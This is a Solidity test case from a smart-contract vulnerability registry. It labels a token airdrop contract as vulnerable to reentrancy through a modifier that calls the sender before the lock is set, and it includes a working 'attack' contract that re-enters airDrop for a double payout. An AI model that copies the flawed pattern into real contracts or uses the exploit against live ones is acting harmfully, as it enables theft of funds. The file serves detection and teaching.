/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: -
 * @fixed_at_lines: 15, 25
 */

pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";
  bool private reentrancy_lock = false;

  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function airDrop() hasNoBalance supportsToken public {
    require(!reentrancy_lock); // check if reentrancy_lock is false
    reentrancy_lock = true; // set reentrancy_lock to true
    tokenBalance[msg.sender] += 20;
    reentrancy_lock = false; // set reentrancy_lock to false
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}